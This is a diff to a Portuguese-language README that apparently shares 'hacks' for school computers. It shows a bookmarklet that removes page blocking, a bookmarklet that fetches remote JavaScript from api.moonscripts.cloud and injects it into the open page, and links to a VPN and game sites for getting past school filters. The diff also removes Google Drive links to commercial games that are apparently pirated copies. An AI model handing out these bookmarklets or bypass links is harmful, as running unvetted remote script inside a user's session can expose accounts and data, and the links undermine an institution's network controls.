@@ -1,4 +1,4 @@
-### 🚀 Us hack ta aqui djoido
+### 🚀 Us hack ta aqui djoido, e do lado tem uns joguinhos pra rapeize do windows
 
 
 <td align="center" width="200">
@@ -24,13 +24,9 @@ javascript:function remove_block(){const e=function(e){return e.stopImmediatePro
 ```javascript
 javascript:(async()=>{let r=await fetch("https://api.moonscripts.cloud/book");let t=await r.text();let s=document.createElement("script");s.textContent=t;document.body.appendChild(s);})();
 ```
-### Link para o VPN que funciona nos positivo, e alguns sites de jogos (talvez eu ache um pros prata, n sei)
+### Link para o VPN que funciona nos positivo, e alguns sites de jogos
 ### https://apps.microsoft.com/detail/9pkl3h9lwmb7?hl=pt-BR&gl=RU
 ### https://rec0ded88.com/
 ### https://sites.google.com/classroom.center/view-1/
 ### Doritus: https://doritus.cloud/
-### Joguinhos que deixei pra vcs do windows:
-### Balatro: https://drive.google.com/file/d/11bQqw8XiFBNrD84VTT_5ce7aAvhdiBXq/view
-### Plants Vs Zombies (PVZ GOTY): https://drive.google.com/file/d/1WHd1dChxINxJLtWrMB0IM5DJ0znGMF0z/view?usp=drive_link
-### Full tilt Pinball!: https://drive.google.com/file/d/15bnQOaGOrOuWJM6WW1rexH5T_K9-w18C/view?usp=drive_link
 
